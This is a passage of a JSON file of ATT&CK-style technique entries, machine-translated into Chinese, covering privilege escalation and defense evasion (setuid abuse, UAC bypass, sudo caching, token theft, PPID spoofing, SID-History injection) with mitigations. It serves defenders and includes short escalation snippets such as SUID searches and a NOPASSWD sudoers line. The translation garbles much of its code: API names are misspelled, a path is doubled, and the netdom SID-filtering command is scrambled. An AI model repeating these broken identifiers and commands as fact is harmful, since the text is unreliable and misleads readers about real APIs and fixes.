        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "云环境中的有效帐户可能会使对手能够执行动作以实现初始访问，持久性，特权升级或防御逃避。云帐户是由组织创建和配置的，供用户使用，远程支持，服务或云服务提供商或SaaS应用程序中的资源管理。云帐户可以仅存在于云中，也可以通过与其他身份源（例如Windows Active Directory）联合通过联邦来源在本地系统和云之间连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "服务或用户帐户可以通过蛮力，网络钓鱼或其他各种访问环境的方式来针对对手。联邦帐户可能是对手影响本地系统和云环境的途径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在折衷的云帐户上创建持久的额外云凭据，以保持环境中的持久性。这些凭据也可以用于绕过安全控制，例如多因素身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云帐户还可以通过环境中的各种方式假设临时提高云访问或其他特权。在角色分配或角色假设策略中进行的错误配置可能允许对手使用这些机制来利用帐户预期范围之外的权限。此类特权帐户可用于通过云API或其他方法从在线存储帐户和数据库中收集敏感数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用不支持MFA的旧版身份验证，而需要使用现代身份验证协议。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "对云帐户，尤其是特权帐户使用多因素身份验证。这可以以多种形式（例如硬件，虚拟，SMS）实现，也可以使用管理报告功能进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保云帐户，特别是特权帐户，在网络上的所有系统中都具有复杂的独特密码。密码和访问密钥应定期旋转。如果凭据在不知情的情况下损害了凭据，这限制了时间凭据可用于访问资源。云服务提供商可能会跟踪访问密钥年龄，以帮助审核并确定可能需要旋转的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "经常查看特权云帐户许可级别，以寻找可以允许对手获得广泛访问的人，例如Azure AD中的全球管理员和特权角色管理员。这些评论还应检查是否创建了未授权的新特权云帐户。例如，在Azure Ad环境中，请求警报以通知帐户何时在不使用特权角色的情况下进行了很多天，因为这些角色可以被删除。考虑使用临时，即时（JIT）特权访问Azure AD资源，而不是永久分配特权角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用户帐户并删除那些不活动或不必要的帐户。限制用户帐户创建其他帐户的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.001",
    "name": "Setuid and Setgid",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用应用程序设置的应用程序或setGID位，以使代码在其他（可能更有特权）用户的上下文中运行。在Linux或MacOS上，当设置了应用程序二进制的setuID或setGID位时，该应用程序将分别以拥有用户或组的特权运行。通常，无论用户或组拥有该应用程序，都在当前用户的上下文中运行应用程序。但是，在某些情况下，需要在高架上下文中执行程序才能正常运行，但是运行它们的用户可能没有特定所需的特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "任何用户都可以为自己的应用程序设置要设置的setUID或setGID标志（即Linux和Mac文件以及目录权限修改），而不是必须在Sudoers文件中创建条目。"
        },
        {
          "type": "code",
          "content": " chmod "
        },
        {
          "type": "text",
          "content": "命令可以使用位卸义，"
        },
        {
          "type": "code",
          "content": " chmod 4777 [file] "
        },
        {
          "type": "text",
          "content": "或通过速记命名，"
        },
        {
          "type": "code",
          "content": " chmod u+s [file] "
        },
        {
          "type": "text",
          "content": "。这将启用setuid位。要启用setGid位，可以使用"
        },
        {
          "type": "code",
          "content": " chmod 2775 "
        },
        {
          "type": "text",
          "content": " "
        },
        {
          "type": "code",
          "content": " chmod g+s "
        },
        {
          "type": "text",
          "content": "可以使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在自己的恶意软件上使用这种机制，以确保他们将来能够在高架上下文中执行。这种滥用通常是“壳逃脱”或其他行动绕过具有限制权限的执行环境的一部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "另外，对手可以选择使用已经启用的setuID或setGID位（即文件和目录发现）找到和靶向弱势二进制文件。通过"
        },
        {
          "type": "code",
          "content": " ls -L "
        },
        {
          "type": "text",
          "content": "查看文件属性时，setUID和setGuID位用“ s”而不是“ x”表示。"
        },
        {
          "type": "code",
          "content": "查找"
        },
        {
          "type": "text",
          "content": "命令也可以用于搜索此类文件。例如，"
        },
        {
          "type": "code",
          "content": " find/-perm +4000 2>/dev/null "
        },
        {
          "type": "text",
          "content": "可用于查找具有setuid set的文件和"
        },
        {
          "type": "code",
          "content": " find/-perm +2000 2>/dev/dev/null "
        },
        {
          "type": "text",
          "content": "可以用于setGID。然后，具有这些位置的二进制文件可能会被对手滥用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "具有已知漏洞或已知外壳逃生的应用程序不应设置固定位或setGID位，以减少应用程序损害的潜在损害。此外，应在系统中最小化具有setuID或setGID位的程序数量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.002",
    "name": "Bypass User Account Control",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以绕过UAC机制来提高系统特权。Windows用户帐户控制（UAC）允许程序提高其特权（以低至高度为单位的完整性级别跟踪）以执行管理员级别的任务，这可能是通过提示用户确认确认的。对用户的影响范围从拒绝高执行下的操作到允许用户在本地管理员组中执行操作，并单击该提示，或者允许他们输入管理员密码以完成操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果将计算机的UAC保护级别设置为除最高级别以外的任何内容，则某些Windows程序可以提升特权或执行某些高架组件对象模型对象，而无需通过UAC通知框提示用户。一个例子是使用rundll32加载特定制作的DLL，该dll加载自动升级的组件对象模型对象，并在受保护的目录中执行文件操作，该目录通常需要提高访问权限。恶意软件也可能被注入一个值得信赖的过程中，以在不提示用户提示的情况下获得提高特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "已经发现许多方法绕过UAC。UACME的GitHub读数页面包含已发现和实施的大量方法列表，但可能不是全面的旁路列表。定期发现其他旁路方法，有些在野外使用，例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "EventVwr.exe可以自动说明并执行指定的二进制或脚本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果已知具有管理员特权的帐户的凭据，则可以通过一些横向移动技术进行另一个旁路，因为UAC是单个系统安全机制，并且在一个系统上运行的过程的特权或完整性在一个系统上运行的特权或完整性将在远程系统上不明，并且默认为高完整性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "检查Windows系统上的常见UAC旁路弱点，以了解风险姿势并在适当的情况下解决问题。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "从系统上的本地管理员组中删除用户。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑将Windows更新到最新版本和补丁级别，以利用针对UAC旁路的最新保护措施。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "尽管存在UAC旁路技术，但在可能的情况下，使用UAC的最高执法级别仍然是谨慎的，并减轻诸如DLL搜索订单劫持等技术存在的旁路机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.003",
    "name": "Sudo and Sudo Caching",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以执行Sudo缓存和/或使用Sudoers文件来提高特权。对手可以这样做，以执行命令作为其他用户或具有更高特权的产卵过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS系统中，Sudo（有时称为“ Superuser do”）允许用户从具有升高特权的终端执行命令，并控制谁可以在系统上执行这些命令。"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "命令“允许系统管理员委派权限，以使某些用户（或用户组）能够运行某些（或全部）命令作为root或其他用户，同时提供审计跟踪命令及其论点。”由于Sudo是为系统管理员制作的，因此它具有一些有用的配置功能，例如"
        },
        {
          "type": "code",
          "content": " timestamp_timeout "
        },
        {
          "type": "text",
          "content": "，这是"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "实例之间的时间量 - 预计密码。这是因为"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "有能力在一段时间内缓存凭据。sudo在"
        },
        {
          "type": "code",
          "content": "/var/db/sudo "
        },
        {
          "type": "text",
          "content": "上创建（或触摸）文件，并在上次运行何时进行时间戳以确定此超时。此外，还有一个"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "变量，可以隔离处理每个新的TTY（终端会话）。这意味着，例如，一个TTY的Sudo超时不会影响另一个TTY（您必须再次键入密码）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "sudoers文件，"
        },
        {
          "type": "code",
          "content": "/etc/sudoers "
        },
        {
          "type": "text",
          "content": "，描述了哪些用户可以运行哪些命令以及从哪些终端来运行。这还描述了哪些命令用户可以作为其他用户或组运行。这提供了最少特权的原则，使用户在大多数情况下在最低的权限中运行，并且只能根据需要提示密码来提高其他用户或权限。但是，sudoers文件还可以指定何时不提示用户使用"
        },
        {
          "type": "code",
          "content": " user1 all =（all）nopasswd：all "
        },
        {
          "type": "text",
          "content": "之类的线路。不过，需要提高特权来编辑此文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以滥用这些机制的不良配置，以升级特权，而无需用户的密码。例如，可以监视"
        },
        {
          "type": "code",
          "content": "/var/db/sudo "
        },
        {
          "type": "text",
          "content": "的时间戳，以查看它是否属于"
        },
        {
          "type": "code",
          "content": " timestamp_timeout "
        },
        {
          "type": "text",
          "content": " ranga。如果是这样，则恶意软件可以执行sudo命令，而无需提供用户的密码。另外，如果禁用"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "，则对手可以从该用户的任何TTY中执行此操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在野外，恶意软件已禁用"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "，通过发出"
        },
        {
          "type": "code",
          "content": " echo \\'默认值！为了反映此更改，恶意软件还会发出 killall终端"
        },
        {
          "type": "text",
          "content": "。与Macos Sierra一样，Sudoers文件默认情况下启用了"
        },
        {
          "type": "code",
          "content": " tty_tickets "
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用"
            },
            {
              "type": "code",
              "content": " tty_tickets "
            },
            {
              "type": "text",
              "content": "设置将防止在TTY会话中泄漏。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "通过需要密码，即使对手可以获取终端访问，他们也必须知道在sudoers文件中运行任何内容的密码。将"
            },
            {
              "type": "code",
              "content": " timestamp_timeout "
            },
            {
              "type": "text",
              "content": "设置为0将要求用户每次执行"
            },
            {
              "type": "code",
              "content": " sudo "
            },
            {
              "type": "text",
              "content": "时输入密码。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "应该严格编辑sudoers文件，以便始终需要密码，并且用户不能随着具有较高特权的用户而产生的风险流程。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.004",
    "name": "Elevated Execution with Prompt",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用"
        },
        {
          "type": "code",
          "content": "授权ExecuteWithPrivileges "
        },
        {
          "type": "text",
          "content": " API通过提示用户凭证升级特权。此API的目的是为应用程序开发人员提供一种使用根特权（例如应用程序安装或更新）执行操作的简便方法。该API未验证要求根特权的程序来自信誉良好的来源或已被恶意修改。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管该API被弃用了，但它仍然在MacOS的最新版本中充分发挥作用。调用此API时，将提示用户输入其凭据，但没有对程序的来源或完整性进行检查。调用API的程序还可以加载世界上可写的文件，这些文件可以修改以使用特权提高的恶意行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": "授权executewithprivileges "
        },
        {
          "type": "text",
          "content": "获得根特权，以便在受害者上安装恶意软件并安装持久机制。该技术可以与伪装成欺骗用户授予恶意代码升级的特权。该技术还显示通过修改使用此API的机器上存在的合法程序来起作用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "系统设置可以防止应用程序运行，这些应用程序尚未通过Apple Store下载，这可能有助于减轻其中一些问题。不允许运行未签名的应用程序也可能降低一些风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548.005",
    "name": "Temporary Elevated Cloud Access",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Abuse Elevation Control Mechanism",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用权限配置，从而使他们能够暂时提高对云资源的访问。许多云环境允许管理员授予用户或服务帐户的权限，以请求即时访问角色，假冒其他帐户，将角色传递到资源和服务上，或者以其他方式获得对一套可能不同的特权的短期访问从他们自己的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "即将到来的访问是一种以精细的临时方式授予云帐户的其他角色的机制。这允许帐户仅在每天需要的权限下运行，并在必要时要求额外的权限。有时，即时访问请求被配置为需要手动批准，而其他时间则自动授予所需的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "帐户模仿允许用户或服务帐户在另一个帐户的权限下临时行动。例如，在具有"
        },
        {
          "type": "code",
          "content": " iam.serviceaccounttokencreator "
        },
        {
          "type": "text",
          "content": "角色的GCP用户中，角色可以创建临时访问令牌或签署服务帐户权限的任意有效负载。在在线交换中，"
        },
        {
          "type": "code",
          "content": "应用程序障碍"
        },
        {
          "type": "text",
          "content": "角色允许服务帐户使用与指定的用户帐户相关的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多云环境还包括用户将角色传递给资源的机制，使他们可以执行任务并对其他服务进行身份验证。虽然创建资源的用户无法直接承担其传递的角色，但他们仍然可以利用角色的访问权限 - 例如，通过配置资源以使用已授予的权限执行某些操作。在AWS中，具有"
        },
        {
          "type": "code",
          "content": " passrole "
        },
        {
          "type": "text",
          "content": "权限的用户可以允许他们创建的服务以扮演给定角色，而在GCP中，使用"
        },
        {
          "type": "code",
          "content": " iam.serviceaccountuser "
        },
        {
          "type": "text",
          "content": "角色可以附加一个服务帐户资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "虽然用户需要特定的角色分配才能使用这些功能，但云管理员可能会错误配置权限。这可能导致升级路径，使对手能够访问超出原本预期的资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：此技术与其他云角色不同，该角色涉及将永久角色分配给帐户，而不是滥用现有的权限结构以暂时提升资源访问。但是，损害足够特权帐户的对手可能会授予另一个帐户，他们控制其他云角色，从而使他们也可以滥用这些功能。与直接使用高度特权帐户相比，这也可以允许更大的隐身，尤其是当日志没有阐明角色模仿时。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将云帐户的特权限制为仅限于所需的内容，以假定，创建或冒充其他角色，政策和权限。在启用及时访问的地方，请考虑需要手动批准才能临时提升特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.001",
    "name": "Token Impersonation/Theft",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会复制，然后模仿另一个用户的现有令牌，以升级特权和绕过访问控件。例如，对手可以使用"
        },
        {
          "type": "code",
          "content": " deplicateToken "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " deplicateTeTokenex "
        },
        {
          "type": "text",
          "content": "复制现有令牌。然后可以将令牌与"
        },
        {
          "type": "code",
          "content": " ImpersonateLoggedOnuser "
        },
        {
          "type": "text",
          "content": "一起使用，以允许调用线程模仿登录用户的安全性上下文，或"
        },
        {
          "type": "code",
          "content": " setThreadToken "
        },
        {
          "type": "text",
          "content": "将假冒的令牌分配给线程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手有一个特定的现有过程，他们希望将重复的令牌分配给，他们可能会执行令牌模仿/盗窃。例如，这对于目标用户在系统上具有非网络登录会话时可能很有用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手会使用重复的令牌来创建新过程而不是附加到现有过程中时，他们可以使用令牌使用"
        },
        {
          "type": "code",
          "content": " createProcesprocesswithtokenw "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " createprocrecessasasuserw "
        },
        {
          "type": "text",
          "content": "来创建进程。令牌模仿/盗窃也不同于制造和模仿令牌，因为它是指复制现有令牌，而不是创建新的令牌。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.002",
    "name": "Create Process with Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建一个新的过程，并具有现有令牌，以升级特权和绕过访问控件。可以使用"
        },
        {
          "type": "code",
          "content": " createProcessWithTokenW "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " runas "
        },
        {
          "type": "text",
          "content": "的功能，使用其他用户的令牌和结果安全上下文创建进程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用与当前用户无关的令牌创建流程可能需要目标用户的凭据，特定特权来模仿该用户或访问要使用的令牌。例如，可以通过代币模仿/盗窃来复制令牌，或在用于创建过程之前通过Make and Phagships farne创建的令牌。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管该技术与令牌的模仿/盗窃不同，但这些技术可以在复制令牌的情况下结合使用，然后用于创建新的过程。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.003",
    "name": "Make and Impersonate Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使新的代币并模仿用户升级特权和绕过访问控件。例如，如果对手具有用户名和密码，但是未将用户登录到系统，则对手可以使用"
        },
        {
          "type": "code",
          "content": " logonuser "
        },
        {
          "type": "text",
          "content": "函数为用户创建登录会话。该功能将返回新会话的访问令牌的副本，对手可以使用"
        },
        {
          "type": "code",
          "content": " setThreadToken "
        },
        {
          "type": "text",
          "content": "将令牌分配给线程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这种行为不同于令牌模仿/盗窃，因为这是指创建新用户令牌，而不是窃取或重复现有的用户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限，以便用户和用户组无法创建令牌。此设置应仅针对本地系统帐户定义。GPO：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户版权分配：创建一个令牌对象。还定义谁可以通过GPO创建一个流程级别令牌，仅通过GPO：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>用户权利分配：替换流程级别标记。"
            }
          ],
          [
            {
              "type": "text",
              "content": "管理员应使用内置访问令牌操作命令"
            },
            {
              "type": "code",
              "content": " runas "
            },
            {
              "type": "text",
              "content": "使用管理员特权以标准用户登录其工具。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134.004",
    "name": "Parent PID Spoofing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会为逃避过程监测防御或提高特权的新过程欺骗父进程标识符（PPID）。除非明确指定，否则通常会直接从父母或致电过程中产生新过程。明确分配新过程的PPID的一种方法是通过"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": " api调用，该调用支持定义使用PPID的参数。Windows功能（例如用户帐户控件（UAC））使用此功能来正确设置PPID，该功能由系统产生请求的提升过程（通常通过"
        },
        {
          "type": "code",
          "content": " svchost.exe.exe "
        },
        {
          "type": "text",
          "content": "或<code> consent.exe.exe </代码>），而不是当前的用户上下文。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用这些机制来逃避防御措施，例如直接从办公室文档产生的那些阻止过程，以及针对异常/潜在的恶意父母亲子过程关系的分析，例如欺骗popiD popi> code> explorer.exe.exe.exe</code>而不是作为矛盾附件的一部分提供的办公室文件。这种欺骗可以通过恶意办公室文档或任何可以执行本机API的代码中的Visual Basic执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "明确分配PPID还可以在给定适当访问父进程的权限的情况下启用提升特权。例如，特权用户上下文中的对手（即管理员）可以产生一个新的过程，并将父派分配为运行为系统的过程（例如"
        },
        {
          "type": "code",
          "content": " lsass.exe "
        },
        {
          "type": "text",
          "content": "），从而导致新过程是通过继承的访问令牌提升。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1134.005",
    "name": "SID-History Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Access Token Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用SID历史注射来升级特权和绕过访问控件。Windows安全标识符（SID）是标识用户或组帐户的唯一值。Windows Security在安全描述符和访问令牌中使用了SIDS。一个帐户可以在SID历史的Active Directory属性中保存其他SID，从而允许在域之间进行可互操作的帐户迁移（例如，SID历史中的所有值都包含在访问令牌中）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "借助域管理员（或同等）权利，可以将收获或众所周知的SID值插入SID历史，以使任意用户/组（例如企业管理员）模仿。这种操作可能会导致对本地资源的访问和/或通过横向移动技术（例如远程服务，SMB/Windows管理员共享或Windows Remote Management）访问其他不可访问的域。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "合法帐户迁移完成后，清理SID历史属性。"
            }
          ],
          [
            {
              "type": "text",
              "content": "考虑将SID过滤应用于森林信托和外部信托等令人震惊的信托，以将SID历史排除在访问域资源的请求之外。SID过滤可确保对信托的任何身份验证请求仅包含来自受信任域的安全主体SID（即防止受信任的域声称用户具有域以外的组成员资格）。"
            }
          ],
          [
            {
              "type": "text",
              "content": "默认情况下启用了森林信托的SID过滤，但在某些情况下可能已被禁用，以使儿童领域能够提供访问森林信托。SID对外部信任的过滤将在所有创建的外部信任使用服务器2003或更高版本的域控制器上自动启用。但是，请注意，SID过滤不会自动应用于旧信托基金，或者可能已故意禁用以允许对资源的范围访问。"
            }
          ],
          [
            {
              "type": "text",
              "content": "SID过滤可以通过："
            }
          ],
          [
            {
              "type": "text",
              "content": "使用Net tombor工具（NetDom Trust /domain： /ensebalsidhistory：no域控制器上的NO）将SID滤清器隔离到外部信托（NetDom Trust /domain net tomain /partinains：net tomain：yes on the域控制器），将SID滤清器隔离到外部信托，将SID滤清器隔离到外部信托：nobersIdhistory：nomable history：yes the域控制器），将森林信托上的介绍性禁用于森林信托。不建议将SID过滤应用于单个森林中的域信任，因为它是一种不受支持的配置，可能会导致破裂的变化。如果森林中的一个领域是不信任的，那么它不应是森林的成员。在这种情况下"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484.001",
    "name": "Group Policy Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Domain Policy Modification",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改组策略对象（GPO），以颠覆域的预期酌处访问控件，通常是为了在域上升级特权。组策略允许在Active Directory（AD）中对用户和计算机设置进行集中管理。GPO是由存储在可预测的网络路径中的文件组成的组策略设置的容器"
        },
        {
          "type": "code",
          "content": " \\ <domain> \\ sysvol \\ <domain> \\ policies \\ "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "像AD中的其他对象一样，GPO具有与之关联的访问控件。默认情况下，该域中的所有用户帐户都有权限阅读GPO。可以委派GPO访问控制权限，例如将访问权限为域中的特定用户或组。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意GPO修改可用于实施许多其他恶意行为，例如计划的任务/作业，禁用或修改工具，入口工具传输，创建帐户，服务执行等。由于GPO可以控制广告环境中的许多用户和机器设置，因此可能会造成大量潜在攻击，这可能源于这种GPO滥用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，可以利用"
        },
        {
          "type": "code",
          "content": "诸如    new-gpoimmediateTeTask "
        },
        {
          "type": "text",
